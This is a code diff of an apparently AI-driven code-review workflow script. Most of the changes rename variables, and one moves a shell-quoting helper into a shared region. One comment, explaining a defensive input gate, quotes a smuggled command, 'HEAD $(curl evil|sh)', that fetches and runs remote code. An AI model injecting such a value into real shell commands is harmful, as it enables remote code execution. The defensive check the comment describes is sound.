@@ -159,14 +159,14 @@ function normalizeKeyValueArgs(text, warn) {
  * `log`. It is called on the recovered forms too, deliberately: a run that silently accepted a
  * shape it had to repair teaches the next caller nothing.
  *
- * @param {unknown} args
+ * @param {unknown} rawArgs
  * @param {(msg: string) => void} [warn]
  * @returns {Record<string, unknown>}
  */
-function normalizeArgs(args, warn = () => {}) {
-  if (args && typeof args === 'object' && !Array.isArray(args)) return /** @type {Record<string, unknown>} */ (args)
-  if (typeof args !== 'string' || !args.trim()) return {}
-  const text = args.trim()
+function normalizeArgs(rawArgs, warn = () => {}) {
+  if (rawArgs && typeof rawArgs === 'object' && !Array.isArray(rawArgs)) return /** @type {Record<string, unknown>} */ (rawArgs)
+  if (typeof rawArgs !== 'string' || !rawArgs.trim()) return {}
+  const text = rawArgs.trim()
   if (text.startsWith('[') || text.startsWith('"')) {
     warn(`⚠️ args arrived as a JSON value that is not an object (${text.slice(0, 40)}) — ALL options ignored, running with defaults`)
     return {}
@@ -181,9 +181,9 @@ const DEPENDENCY_SOURCE_HOW = 'Finding a dependency\'s source: open the version 
 // <<< craft-inline
 /** @type {Record<string, unknown>} */
 const A = normalizeArgs(args, log)
-/** A string argument as given, or '' when it is absent or falsy. @param {string} key */
-function argString(key) {
-  return A[key] ? String(A[key]) : ''
+/** A string argument as given, or '' when it is absent or falsy. @param {string} argName */
+function argString(argName) {
+  return A[argName] ? String(A[argName]) : ''
 }
 const baseArg = argString('base')
 const intentArg = argString('intent')
@@ -1627,14 +1627,14 @@ async function matchFindings(findings, decisions, judge, reraisedSure = undefine
     return p && resolvePlan(f, p, byFinding.get(f))
   }
   /** @param {DecidableFinding} f @returns {Contradiction | undefined} */
-  const contradictionOf = f => (matchOf(f) ? undefined : against.get(f))
+  const judgedContradictionOf = f => (matchOf(f) ? undefined : against.get(f))
   /** The record the judge says `f`'s code goes against, matched or not — for a re-raised match. @param {DecidableFinding} f @returns {Contradiction | undefined} */
   const violationOf = f => against.get(f)
   const cutF = new Set(pairs.slice(sent.length, sent.length + CUT_NAMED_MAX).map(p => p.f))
   const unnamed = [...sent, ...pairs.slice(sent.length + CUT_NAMED_MAX)]
   const titleless = judge ? [...new Set(unnamed.filter(p => namesNoRule(p.f) && !cutF.has(p.f) && !byFinding.get(p.f)?.has(p.d) && !matchOf(p.f)).map(p => p.f))] : []
   if (titleless.length) refused.push(rulelessUnjudgedNote(titleless))
-  return { matchOf, contradictionOf, violationOf, notes, refused }
+  return { matchOf, contradictionOf: judgedContradictionOf, violationOf, notes, refused }
 }
 
 /**
@@ -2751,7 +2751,7 @@ const lightKeptLenses = new Set()
 /** Whether any profile reached its lens phase: a light report on an earlier exit says no lens ran. */
 let lensPhaseReached = false
 /** The extra lenses that answered, and those that did not, each with the class of its failure. */
-const extraLensOutcome = { ran: /** @type {string[]} */ ([]), failed: /** @type {{ agent: string, why: string }[]} */ (extraLensRequest.refused.map(agent => ({ agent, why: 'not an agent type name' }))), discovery: '', reached: false, exit: /** @type {{ reason: string, needed: boolean } | null} */ (null) }
+const extraLensOutcome = { ran: /** @type {string[]} */ ([]), failed: /** @type {{ agent: string, why: string }[]} */ (extraLensRequest.refused.map(agentTypeName => ({ agent: agentTypeName, why: 'not an agent type name' }))), discovery: '', reached: false, exit: /** @type {{ reason: string, needed: boolean } | null} */ (null) }
 
 // A cold full-workspace build is the one step in this workflow that can run for an hour and take the
 // whole review down with it: a gate agent that sits in `cargo clippy` stops emitting, the harness
@@ -3224,8 +3224,8 @@ const optionalSection = () => {
     const unrequested = skipped.filter(l => !optionalRequested.includes(l))
     // The critic only ever names an unrequested lens, so it is already in the one optional= offer
     // above; here it is a signal for the re-run, not a second instruction.
-    const criticLine = named.length ? `\n⚠️ The completeness critic named ${named.join(', ')} as an uncovered surface for THIS diff. It was not dispatched; once the gate is green, weigh including it in that re-run.\n` : ''
-    return `\n\n## Not looked at — the optional pass did not run\n⚠️ These lenses were NOT dispatched, so this review makes NO statement about what they cover: ${skipped.join(', ')}. That is an absence of a result, not a clean one. The mechanical gate is red, which blocks this review by itself — fix the gate first.${unrequested.length ? ` ${unrequested.join(', ')} ${unrequested.length === 1 ? 'is' : 'are'} off by default; add \`optional=${unrequested.join(',')}\` to the re-run only if you want ${unrequested.length === 1 ? 'it' : 'them'}.` : ''}\n` + criticLine
+    const criticHint = named.length ? `\n⚠️ The completeness critic named ${named.join(', ')} as an uncovered surface for THIS diff. It was not dispatched; once the gate is green, weigh including it in that re-run.\n` : ''
+    return `\n\n## Not looked at — the optional pass did not run\n⚠️ These lenses were NOT dispatched, so this review makes NO statement about what they cover: ${skipped.join(', ')}. That is an absence of a result, not a clean one. The mechanical gate is red, which blocks this review by itself — fix the gate first.${unrequested.length ? ` ${unrequested.join(', ')} ${unrequested.length === 1 ? 'is' : 'are'} off by default; add \`optional=${unrequested.join(',')}\` to the re-run only if you want ${unrequested.length === 1 ? 'it' : 'them'}.` : ''}\n` + criticHint
   }
   const criticLine = named.length ? `\n⚠️ The completeness critic named ${named.join(', ')} as an uncovered surface for THIS diff. It was still not dispatched — the optional pass is bought by an explicit request, not by a model mid-run — so buy it deliberately with \`optional=${named.join(',')}\`.\n` : ''
   return `\n\n## Not looked at — the optional pass did not run\n⚠️ These lenses were NOT dispatched, so this review makes NO statement about what they cover: ${skipped.join(', ')}. That is an absence of a result, not a clean one. They are off by default because they returned no High findings on the run that was measured — one diff of one repository, so the basis is a single point, not a settled law; to buy them, re-run with \`optional=true\` (or \`optional=${skipped.join(',')}\`).\n`
@@ -3351,11 +3351,11 @@ const surfaceGateNamedByCritic = new Set()
 // in NO active profile.
 const surfaceGateTally = () => ({ dropped: savedSurfaceDrops(results, surfaceGateDispatched) })
 const surfaceGateSection = () => {
-  const dropped = surfaceGateTally().dropped
-  if (!dropped.length) return ''
+  const gateDropped = surfaceGateTally().dropped
+  if (!gateDropped.length) return ''
   // `dropped` already subtracts what ran, so a critic-named lens that ran somewhere is not a gap.
-  const named = dropped.filter(l => surfaceGateNamedByCritic.has(l))
-  return `\n\n## Not run — the diff does not touch the surface these lenses need\n⚠️ These whole-repo lenses were NOT dispatched, so this review makes NO statement about what they cover: ${dropped.join(', ')}. Each fires only when the diff touches the surface its defect class needs (a cross-boundary symbol, a wire/serialized form, an invariant-bearing type), and this diff does not. That is an absence of a result, not a clean one.\n`
+  const named = gateDropped.filter(l => surfaceGateNamedByCritic.has(l))
+  return `\n\n## Not run — the diff does not touch the surface these lenses need\n⚠️ These whole-repo lenses were NOT dispatched, so this review makes NO statement about what they cover: ${gateDropped.join(', ')}. Each fires only when the diff touches the surface its defect class needs (a cross-boundary symbol, a wire/serialized form, an invariant-bearing type), and this diff does not. That is an absence of a result, not a clean one.\n`
     + (named.length ? `\n⚠️ The completeness critic named ${named.join(', ')} as an uncovered surface for THIS diff. It was still NOT dispatched — the surface gate is the deliberate boundary, not something a model re-opens mid-run — so treat this as a visible gap, not a clean pass.\n` : '')
 }
 
@@ -4297,20 +4297,6 @@ function promptFields(f) {
     whereChecked: flattenField(f['whereChecked']),
   }
 }
-// POSIX single-quote shell-escaper for a model-authored value that lands in a shell command a
-// sub-agent will RUN (the carry/adjudicate `git diff -- <path>`). Single quotes disable ALL shell
-// expansion, so `$(...)`, backtick, `$VAR`, spaces and `;`/`|`/`&` inside are literal. The `'\''`
-// sequence (close-quote, escaped-quote, reopen-quote) safely embeds a literal single quote. Note:
-// JSON.stringify does NOT make a value shell-safe — it only escapes `"`/`\`/control chars, and inside
-// a double-quoted shell context `$(...)`, backtick and `$VAR` still expand; single-quoting is what
-// neutralizes them.
-// UNGATED TWIN: this `shq` lives OUTSIDE the craft-inline fence and is excluded from that region's
-// name list to avoid a duplicate declaration — so `check-workflows` byte-compares the escaper against
-// lib/run-logging.mjs in the other three engines and is blind to it here. A hardening that lands on
-// the source therefore regenerates into three engines and silently skips the fourth, which is the
-// only one passing model-authored `repo`/`runDir` through it. Change one, change this by hand.
-/** @param {unknown} s */
-function shq(s) { return `'${String(s ?? '').replace(/'/g, `'\\''`)}'` }
 // A conservative "is this a safe commit-ish?" gate for a model-authored ledger `head` before it is
 // interpolated into a shell command. Accept a git SHA (7–40 hex) or a ref name drawn only from
 // shell-inert characters (alnum plus `._/-`, no spaces/metacharacters). A crafted `HEAD $(curl evil|sh)`
@@ -4811,7 +4797,7 @@ function pathspecLiteral(file) {
 // Pure helper, tested as a real module in lib/agent-deadline.mjs and pasted back here by the
 // craft-inline gate. The rationale for a shared budget — and why the thresholds themselves must NOT
 // move — lives there.
-// >>> craft-inline lib/agent-deadline.mjs deadlineSpan deadlineArm makeDeadlineBudget
+// >>> craft-inline lib/agent-deadline.mjs deadlineSpan deadlineArm makeDeadlineBudget DEADLINE_HIT
 /** @param {number} totalMs @param {number} floorMs @returns {{ capped: number, floor: number }} */
 function deadlineSpan(totalMs, floorMs) {
   const total = Number(totalMs)
@@ -4868,9 +4854,10 @@ function makeDeadlineBudget(totalMs, { floorMs = 0, schedule, cancel } = {}) {
     dispose: () => { for (const disarm of timers) disarm() },
   }
 }
-// <<< craft-inline
 
 const DEADLINE_HIT = { craftDeadline: true }
+// <<< craft-inline
+
 const DEFAULT_DEADLINE_MS = 1800000
 /** @type {Record<string, number>} */
 const PHASE_DEADLINE_MS = { Scout: 900000, Gate: 1800000, Lenses: 5400000, Verify: 1800000, Adjudicate: 1800000, Synthesize: 1800000 }
@@ -5068,8 +5055,8 @@ function honestVerdictLine(text, notRun) {
   const at = verdictLineAt(lines)
   if (at < 0) return s
   const line = String(lines[at])
-  const word = VERDICT_WORD.exec(line.replace(/^[\s#*_>-]*verdict\b/i, ''))
-  if (!word || !GREEN_WORD.test(String(word[1]))) return s
+  const verdictWord = VERDICT_WORD.exec(line.replace(/^[\s#*_>-]*verdict\b/i, ''))
+  if (!verdictWord || !GREEN_WORD.test(String(verdictWord[1]))) return s
   const fixed = line.replace(/(?:(?:\u2705|\u26a0\ufe0f?)\s*)?\b(?:Approve|Healthy|Clean)\b(?:\s*\((?:INCOMPLETE|PARTIAL COVERAGE)\))?/i, '\u26a0\ufe0f INCOMPLETE')
   const list = missing.join('; ')
   const named = /did not run/i.test(fixed) ? '' : ` \u00b7 part of this review did not run: ${list.length > NOTE_MAX ? `${list.slice(0, NOTE_MAX)}\u2026` : list}`
@@ -5106,32 +5093,32 @@ async function ragent(prompt, opts = {}) {
   // is the difference between one slot held for 30 minutes and one held for an hour.
   // ARMED, not measured: the sandbox has no clock at all (see the module), so every attempt races
   // the SAME timer rather than a fresh one computed from elapsed time.
-  const budget = makeDeadlineBudget(ms, { floorMs: retryFloorMs(ms) })
+  const deadlineBudget = makeDeadlineBudget(ms, { floorMs: retryFloorMs(ms) })
   try {
     // The one place the sandbox's `unknown` becomes the schema's type: agent() validates against the
     // schema it was handed, and `opts.schema` is that schema with the type it validates into.
-    return /** @type {T | null} */ (await withBudget(prompt, agentOpts, budget, breaker, opts))
+    return /** @type {T | null} */ (await withBudget(prompt, agentOpts, deadlineBudget, breaker, opts))
   } finally {
     // The armed timers outlive the answer otherwise, holding the run open for the whole deadline.
-    budget.dispose()
+    deadlineBudget.dispose()
   }
 }
 
-/** @param {string} prompt @param {AgentOptions} agentOpts @param {ReturnType<typeof makeDeadlineBudget>} budget @param {ReturnType<typeof makeDeathBreaker> | null | undefined} breaker @param {AgentOpts} opts @returns {Promise<unknown>} */
-async function withBudget(prompt, agentOpts, budget, breaker, opts) {
+/** @param {string} prompt @param {AgentOptions} agentOpts @param {ReturnType<typeof makeDeadlineBudget>} deadlineBudget @param {ReturnType<typeof makeDeathBreaker> | null | undefined} breaker @param {AgentOpts} opts @returns {Promise<unknown>} */
+async function withBudget(prompt, agentOpts, deadlineBudget, breaker, opts) {
   for (let attempt = 1; ; attempt++) {
     const o = attempt === 1 ? agentOpts : { ...agentOpts, label: `retry:${agentOpts.label || 'agent'}` }
     // The SHARED deadline promise, not a per-attempt timer. A second attempt inherits what is left
     // of the first one's wait by construction — there is nothing to subtract and no clock to read.
     // inSessionDir: the one step that must read the session's own project, not the `repo` under review.
-    const res = await raceLimited(prompt, o, budget, opts)
+    const res = await raceLimited(prompt, o, deadlineBudget, opts)
     if (res === LIMIT_HIT) return null
     // Asked AFTER the race, so it reflects the state the attempt actually ended in. A re-dispatch
     // launched below the floor would fire the deadline before the agent could answer, costing a
     // harness slot to produce nothing.
-    const spentOut = budget.belowFloor()
+    const spentOut = deadlineBudget.belowFloor()
     if (res === DEADLINE_HIT) {
-      logDeadlineFire(o, budget)
+      logDeadlineFire(o, deadlineBudget)
       return null
     }
     if (res !== null && res !== undefined) {
@@ -5140,15 +5127,15 @@ async function withBudget(prompt, agentOpts, budget, breaker, opts) {
       if (breaker) breaker.recordLive()
       return res
     }
-    if (!redispatchAfterDeath(attempt, spentOut, budget, breaker, opts)) return null
+    if (!redispatchAfterDeath(attempt, spentOut, deadlineBudget, breaker, opts)) return null
   }
 }
 
 const LIMIT_HIT = { craftUsageLimit: true }
-/** One attempt raced against the deadline; LIMIT_HIT when it failed on a usage limit (thrown or answered). @param {string} prompt @param {AgentOptions} o @param {ReturnType<typeof makeDeadlineBudget>} budget @param {AgentOpts} opts @returns {Promise<unknown>} */
-async function raceLimited(prompt, o, budget, opts) {
+/** One attempt raced against the deadline; LIMIT_HIT when it failed on a usage limit (thrown or answered). @param {string} prompt @param {AgentOptions} o @param {ReturnType<typeof makeDeadlineBudget>} deadlineBudget @param {AgentOpts} opts @returns {Promise<unknown>} */
+async function raceLimited(prompt, o, deadlineBudget, opts) {
   try {
-    const res = await Promise.race([agent(`${opts.inSessionDir ? '' : REPO_DIRECTIVE}${prompt}`, o), budget.hit])
+    const res = await Promise.race([agent(`${opts.inSessionDir ? '' : REPO_DIRECTIVE}${prompt}`, o), deadlineBudget.hit])
     return limitStop.observeAnswer(res) ? LIMIT_HIT : res
   } catch (e) {
     if (limitStop.observeError(e)) return LIMIT_HIT
@@ -5156,8 +5143,8 @@ async function raceLimited(prompt, o, budget, opts) {
   }
 }
 
-/** A deadline fire, logged against the budget it spent. @param {AgentOptions} o @param {ReturnType<typeof makeDeadlineBudget>} budget */
-function logDeadlineFire(o, budget) {
+/** A deadline fire, logged against the budget it spent. @param {AgentOptions} o @param {ReturnType<typeof makeDeadlineBudget>} deadlineBudget */
+function logDeadlineFire(o, deadlineBudget) {
   // Deliberately neither counted by the breaker nor a reset of it: a deadline fire cannot be
   // told apart from a live agent taking too long, and feeding that into the window would let slow
   // work suppress the retry that real work depends on. The breaker reads deaths, never durations.
@@ -5169,7 +5156,7 @@ function logDeadlineFire(o, budget) {
   // Sub-minute budgets print as seconds rather than rounding up to "1min": `deadlineMs=30000` is
   // a documented diagnostic value, and a log calling it "0min" or "1min" hides the very setting
   // whose effects the reader is trying to see.
-  const ms = budget.total()
+  const ms = deadlineBudget.total()
   const waited = ms >= 60000 ? `${Math.round(ms / 60000)}min budget` : `${Math.max(1, Math.round(ms / 1000))}s budget`
   // A DEADLINE FIRE NEVER RE-DISPATCHES, and this is an identity rather than a policy: the timer
   // is armed ONCE, for the whole budget, when the budget is created — so its firing IS the budget
@@ -5183,10 +5170,10 @@ function logDeadlineFire(o, budget) {
 
 /**
  * After an attempt that came back empty: whether to re-dispatch (true) or treat the agent as dead (false).
- * @param {number} attempt @param {boolean} spentOut @param {ReturnType<typeof makeDeadlineBudget>} budget
+ * @param {number} attempt @param {boolean} spentOut @param {ReturnType<typeof makeDeadlineBudget>} deadlineBudget
  * @param {ReturnType<typeof makeDeathBreaker> | null | undefined} breaker @param {AgentOpts} opts @returns {boolean}
  */
-function redispatchAfterDeath(attempt, spentOut, budget, breaker, opts) {
+function redispatchAfterDeath(attempt, spentOut, deadlineBudget, breaker, opts) {
   if (attempt >= AGENT_TRIES) return false
   // A death that arrived slowly can exhaust the budget too, and then the re-dispatch buys nothing.
   if (spentOut) {
@@ -5194,7 +5181,7 @@ function redispatchAfterDeath(attempt, spentOut, budget, breaker, opts) {
     // that used to be printed over a remainder that was merely below the floor. The transcript is
     // the only carrier this run's clock is ever measured from, and "spent" and "below the floor"
     // are different events that a future reader has to be able to tell apart.
-    log(`⏱️ agent '${opts.label || '?'}' returned no result with less than the ${Math.round(retryFloorMs(budget.total()) / 1000)}s floor left of its ${Math.round(budget.total() / 1000)}s deadline budget — NOT re-dispatching (a second attempt would time out before it could answer); treated as a dead agent`)
+    log(`⏱️ agent '${opts.label || '?'}' returned no result with less than the ${Math.round(retryFloorMs(deadlineBudget.total()) / 1000)}s floor left of its ${Math.round(deadlineBudget.total() / 1000)}s deadline budget — NOT re-dispatching (a second attempt would time out before it could answer); treated as a dead agent`)
     return false
   }
   // The dead-agent route, and the expensive one: `agent()` resolved null after the harness spent
@@ -5280,11 +5267,11 @@ function refuteRate(refuted, candidates) {
 function isMaintainability(f) {
   return (f['source'] || '') === 'maintainability' || (Array.isArray(f['sources']) && /** @type {unknown[]} */ (f['sources']).includes('maintainability'))
 }
-/** @param {Finding[]} confirmed */
-function finalVerdict(confirmed) {
-  if (strict && confirmed.some(f => isMaintainability(f)
+/** @param {Finding[]} confirmedIn */
+function finalVerdict(confirmedIn) {
+  if (strict && confirmedIn.some(f => isMaintainability(f)
     && (f['severity'] === 'Critical' || f['severity'] === 'High' || f['severity'] === 'Medium'))) return 'Block'
-  return reviewVerdict(confirmed)
+  return reviewVerdict(confirmedIn)
 }
 // indexProjection is NOT mirrored here any more: lib/craft-log-run.mjs imports the real one and owns
 // the index line. A second copy in the workflow would be a copy nothing calls — free to drift out of
@@ -5353,10 +5340,10 @@ const reReviewMemorySection = () => (reReviewMemoryNote ? `## ⚠️ Re-review m
 const reviewerAgentUnavailable = []
 // The agent-type match and the section text are shared with rust-audit (lib/agent-fallback.mjs).
 // >>> craft-inline lib/agent-fallback.mjs isAgentTypeMissing agentUnavailableSection agentUnavailableRecord
-/** @param {unknown} msg @param {string} [agent] */
-function isAgentTypeMissing(msg, agent) {
+/** @param {unknown} msg @param {string} [agentTypeName] */
+function isAgentTypeMissing(msg, agentTypeName) {
   const m = String(msg ?? '')
-  return /not found/i.test(m) && (/agent type/i.test(m) || (!!agent && m.includes(agent)))
+  return /not found/i.test(m) && (/agent type/i.test(m) || (!!agentTypeName && m.includes(agentTypeName)))
 }
 
 /**
@@ -5424,11 +5411,11 @@ const reviewerAgentSection = () => agentUnavailableSection(
   reviewerAgentUnavailable.map(x => ({ agent: x.agent, what: `every ${x.id} lens`, error: x.error })),
   Object.entries(reviewerAgentFallbacks).filter(([id]) => !reviewerAgentUnavailable.some(x => x.id === id))
     .flatMap(([id, n]) => {
-      const agent = reviewerAgentNames[id] || `${id} reviewer agent`
+      const agentName = reviewerAgentNames[id] || `${id} reviewer agent`
       const nf = reviewerAgentNotFound[id]
       return [
-        { agent, count: n - (nf?.count || 0), what: 'lens dispatch(es)' },
-        ...(nf ? [{ agent, count: nf.count, what: 'lens dispatch(es)', error: nf.error }] : []),
+        { agent: agentName, count: n - (nf?.count || 0), what: 'lens dispatch(es)' },
+        ...(nf ? [{ agent: agentName, count: nf.count, what: 'lens dispatch(es)', error: nf.error }] : []),
       ]
     }),
 )
@@ -5455,7 +5442,7 @@ function out(reportText) {
 // ---- the one write path (shared with every other record-filing engine) ----
 // The sandbox cannot import, so lib/run-logging.mjs reaches this script the same way run-record.mjs
 // does: a fenced region regenerated and byte-compared by `node lib/check-workflows.mjs`.
-// >>> craft-inline lib/run-logging.mjs LOGRUN_SCHEMA loggerPrelude payloadVersion engineRevisionFlag runDirFlags logRunPrompt logRunDispatch logRunOutcome quietly checkpointPrompt MISSED_STRUCTURED_OUTPUT missedStructuredOutput loggerAgentDied makeRunLogger telemetryLossNoter
+// >>> craft-inline lib/run-logging.mjs LOGRUN_SCHEMA shq loggerPrelude payloadVersion engineRevisionFlag runDirFlags logRunPrompt logRunDispatch logRunOutcome quietly checkpointPrompt MISSED_STRUCTURED_OUTPUT missedStructuredOutput loggerAgentDied makeRunLogger telemetryLossNoter
 const LOGRUN_SCHEMA = {
   type: 'object',
   additionalProperties: false,
@@ -5465,6 +5452,9 @@ const LOGRUN_SCHEMA = {
     error: { type: 'string', description: 'when ok is false, the failing line verbatim; when ok is true AND the script printed a craft-log-run WARNING line, that line verbatim; empty otherwise' },
   },
 }
+
+/** @param {unknown} s */
+function shq(s) { return `'${String(s ?? '').replace(/'/g, `'\\''`)}'` }
 
 /**
  * @param {string | undefined} craftRoot
@@ -5565,12 +5555,12 @@ ${JSON.stringify(record, null, 2)}`
  * @param {{ phase?: string }} [opts]
  * @returns {{ label: string, phase: string, schema: typeof LOGRUN_SCHEMA, model: 'sonnet' | 'haiku', effort: 'low' }}
  */
-function logRunDispatch(record, { phase = '' } = {}) {
+function logRunDispatch(record, { phase: phaseTitle = '' } = {}) {
   const payloadKB = JSON.stringify(record).length / 1024
   const big = payloadKB > 24
   return {
     label: `log-run${big ? ` (${Math.round(payloadKB)}KB)` : ''}`,
-    phase,
+    phase: phaseTitle,
     schema: LOGRUN_SCHEMA,
     model: big ? 'sonnet' : 'haiku',
     effort: 'low',
@@ -5603,9 +5593,9 @@ function quietly(call) {
 }
 
 /** @param {{ payload?: unknown, craftRoot?: string, repo?: string, phase?: string, dir?: string, rejoin?: boolean }} [opts] */
-function checkpointPrompt({ payload, craftRoot = '', repo = '', phase = '', dir = '', rejoin = false } = {}) {
+function checkpointPrompt({ payload, craftRoot = '', repo = '', phase: phaseTitle = '', dir = '', rejoin = false } = {}) {
   const version = payloadVersion(payload)
-  const flags = `--phase ${shq(phase)} ${engineRevisionFlag(payload)}${runDirFlags(dir, rejoin)}`
+  const flags = `--phase ${shq(phaseTitle)} ${engineRevisionFlag(payload)}${runDirFlags(dir, rejoin)}`
   return `You are the craft observability logger writing ONE phase checkpoint. Mechanical IO — do not analyze.
 
 Run exactly this, then return the runDir the script prints:
@@ -5648,11 +5638,11 @@ function loggerAgentDied(res) {
  * @param {(record: Record<string, unknown>) => Record<string, unknown>} [o.prepare]
  * @returns {(record: Record<string, unknown>) => Promise<void>}
  */
-function makeRunLogger({ call, phase, target, noteLoss, prepare = record => record }) {
+function makeRunLogger({ call, phase: phaseTitle, target, noteLoss, prepare = record => record }) {
   return async recordIn => {
     const record = prepare(recordIn)
     const at = { ...target(), record }
-    const dispatch = logRunDispatch(record, { phase })
+    const dispatch = logRunDispatch(record, { phase: phaseTitle })
     let res = await call(logRunPrompt(at), dispatch)
     if (missedStructuredOutput(res)) res = await call(logRunPrompt({ ...at, retry: true }), dispatch)
     else if (loggerAgentDied(res)) res = await call(logRunPrompt({ ...at, retry: true }), { ...dispatch, model: 'sonnet' })
@@ -5839,8 +5829,8 @@ let rejoinArmed = false
 // run's own phases unfolded. Sticky, because an adoption is not undone by later checkpoints
 // succeeding — once a directory MIGHT be someone else's, it stays might-be for the finalize proof.
 // Resolves true only when the slice landed in the directory this run already had and asked for.
-/** @param {string} phase @param {Record<string, unknown>} payloadIn @param {string} group @returns {Promise<boolean>} */
-async function checkpoint(phase, payloadIn, group) {
+/** @param {string} phaseTitle @param {Record<string, unknown>} payloadIn @param {string} group @returns {Promise<boolean>} */
+async function checkpoint(phaseTitle, payloadIn, group) {
   // kind/name are what the checkpoint DIRECTORY is named after, and `recover` parses them back out of
   // that name to rebuild a dead run's identity. A payload without them produced a real
   // `…Z-unknown-unknown` directory on the first live run — recoverable, but recovered as a run of
@@ -5861,22 +5851,22 @@ async function checkpoint(phase, payloadIn, group) {
   const armRejoin = !runDir && checkpointFailed
   if (armRejoin) rejoinArmed = true
   const { answer: res, threw } = splitThrew(await ragentQuietly(
-    checkpointPrompt({ payload, craftRoot: craftRootArg, repo: repoArg, phase, dir: runDir, rejoin: armRejoin }),
-    { label: `checkpoint:${phase}`, phase: group, schema: CHECKPOINT_SCHEMA, model: 'haiku', effort: 'low' },
+    checkpointPrompt({ payload, craftRoot: craftRootArg, repo: repoArg, phase: phaseTitle, dir: runDir, rejoin: armRejoin }),
+    { label: `checkpoint:${phaseTitle}`, phase: group, schema: CHECKPOINT_SCHEMA, model: 'haiku', effort: 'low' },
   ))
-  if (res?.runDir) return tookRunDir(phase, asked, res.runDir)
+  if (res?.runDir) return tookRunDir(phaseTitle, asked, res.runDir)
   // Remember it: with no runDir to thread, every later checkpoint would mint a directory of its
   // own and this run would fragment into orphan partials that `recover` promotes as unrelated
   // half-runs. `--rejoin` lets the script re-enter the directory this run already has. It is opt-in
   // for a reason — asking for it unconditionally would make a SECOND, concurrent review adopt this
   // one's directory, and concurrent reviews on one machine are ordinary.
   checkpointFailed = true
-  noteTelemetryLoss(`phase checkpoint '${phase}'`, threw || res?.error || 'the logger agent returned no runDir')
+  noteTelemetryLoss(`phase checkpoint '${phaseTitle}'`, threw || res?.error || 'the logger agent returned no runDir')
   return false
 }
 // The directory a landed checkpoint returned, taken as the run's; true when it is the one the run asked for.
-/** @param {string} phase @param {string} asked @param {string} returned @returns {boolean} */
-function tookRunDir(phase, asked, returned) {
+/** @param {string} phaseTitle @param {string} asked @param {string} returned @returns {boolean} */
+function tookRunDir(phaseTitle, asked, returned) {
   // A refused `--dir` does not fail the checkpoint: the script MINTS a fresh directory, prints a
   // WARNING on stderr and returns a perfectly valid runDir on stdout. Taking it silently strands
   // every slice written into the directory we asked for — finalize folds only the new one, its
@@ -5884,7 +5874,7 @@ function tookRunDir(phase, asked, returned) {
   // run clean. The engine can see this without trusting the model to relay stderr: we know which
   // directory we asked for, so a different one coming back IS the refusal.
   if (asked && returned !== asked) {
-    noteTelemetryLoss(`phase checkpoint '${phase}'`, `the logger minted ${returned} instead of the run's own ${asked} — earlier phase slices there will not be folded`)
+    noteTelemetryLoss(`phase checkpoint '${phaseTitle}'`, `the logger minted ${returned} instead of the run's own ${asked} — earlier phase slices there will not be folded`)
   }
   runDir = returned
   return !!asked && returned === asked
@@ -6084,24 +6074,24 @@ function basisVerdictFromRevisions(revs, currentRev = ENGINE_REVISION) {
 //     prints an authoritative `ledgerCount` beside it; if the array that arrived is a different
 //     length, entries were lost in transport and an 82-entry round would otherwise be carried as a
 //     genuine 20-entry one. Degraded → full re-scan, same as a missing ledger.
-/** @param {PriorRound | null} priorRound */
-function ledgerTruncated(priorRound) {
-  if (!priorRound) return false
-  const count = Number(priorRound['ledgerCount'])
+/** @param {PriorRound | null} priorRoundIn */
+function ledgerTruncated(priorRoundIn) {
+  if (!priorRoundIn) return false
+  const count = Number(priorRoundIn['ledgerCount'])
   if (!Number.isFinite(count)) return false   // a record from before the count existed: nothing to check
-  return count !== (Array.isArray(priorRound['ledger']) ? priorRound['ledger'].length : 0)
+  return count !== (Array.isArray(priorRoundIn['ledger']) ? priorRoundIn['ledger'].length : 0)
 }
-/** @param {PriorRound | null} priorRound */
-function ledgerDegraded(priorRound) {
-  if (!priorRound) return false
-  if (ledgerTruncated(priorRound)) return true
-  const findings = Number(priorRound['priorFindings'] || 0)
-  const ledgerLen = Array.isArray(priorRound['ledger']) ? priorRound['ledger'].length : 0
+/** @param {PriorRound | null} priorRoundIn */
+function ledgerDegraded(priorRoundIn) {
+  if (!priorRoundIn) return false
+  if (ledgerTruncated(priorRoundIn)) return true
+  const findings = Number(priorRoundIn['priorFindings'] || 0)
+  const ledgerLen = Array.isArray(priorRoundIn['ledger']) ? priorRoundIn['ledger'].length : 0
   return findings > 0 && ledgerLen === 0
 }
 /** @param {{ priorRound: PriorRound | null, thisRound: number, fullEvery: number, degraded: boolean, journalSourced: boolean }} args */
-function shouldFullRescan({ priorRound, thisRound, fullEvery, degraded, journalSourced }) {
-  if (!priorRound) return true            // a first review is already a full base...HEAD scan
+function shouldFullRescan({ priorRound: priorRoundIn, thisRound: thisRoundIn, fullEvery: fullEveryIn, degraded, journalSourced }) {
+  if (!priorRoundIn) return true            // a first review is already a full base...HEAD scan
   if (degraded) return true               // nothing to carry — a delta-only scan would review almost nothing
   // Kept as its own condition rather than folded into `degraded`: the two are genuinely different
   // failures. `degraded` means the carried ledger is untrustworthy or missing; a journal-sourced
@@ -6110,9 +6100,9 @@ function shouldFullRescan({ priorRound, thisRound, fullEvery, degraded, journalS
   // fix, so `priorRound.head` can equal the caller's current HEAD; a delta scan of head...HEAD would
   // then be empty rather than incremental, silently trading a full review for a blind one.
   if (journalSourced) return true
-  const n = Number(fullEvery)
+  const n = Number(fullEveryIn)
   if (!Number.isFinite(n) || n < 1) return false
-  return Number(thisRound) % n === 0
+  return Number(thisRoundIn) % n === 0
 }
 
 // ================= Detect base + languages =================
@@ -6141,7 +6131,7 @@ async function detectDiedExit() {
 /** @returns {Promise<{ exit: string, detected: null } | { exit: null, detected: DetectAnswer }>} */
 async function detectChanges() {
   if (ambiguousPath) return { exit: await ambiguousPathExit(), detected: null }
-  const detected = await ragent(
+  const detectorAnswer = await ragent(
     `You are resolving the review base and the changed files. Use shell + read only — do NOT review.${pathArg ? `\n\nSCOPE: consider ONLY files under ${shq(pathArg)}; pass \`-- ${shq(pathArg)}\` to the git commands below.` : ''}
 1. Resolve the diff base. ${baseArg
     ? `Use \`${baseArg}\`.`
@@ -6155,15 +6145,15 @@ Return baseRef (the ref you resolved, empty string if none), files (the changed 
   )
   // If base resolution died even after the retry, say so loudly — falling through would
   // produce a misleading "Approve — no supported language" on an empty file list.
-  if (!detected) return { exit: await detectDiedExit(), detected: null }
-  return { exit: null, detected }
+  if (!detectorAnswer) return { exit: await detectDiedExit(), detected: null }
+  return { exit: null, detected: detectorAnswer }
 }
 const detection = await detectChanges()
 if (detection.exit !== null) return detection.exit
 const detected = detection.detected
-/** What the detect agent resolved, normalised: the base, the changed files, the spec and the run's identity. @param {DetectAnswer} detected */
-function detectedChange(detected) {
-  const baseRef = detected.baseRef ?? baseArg
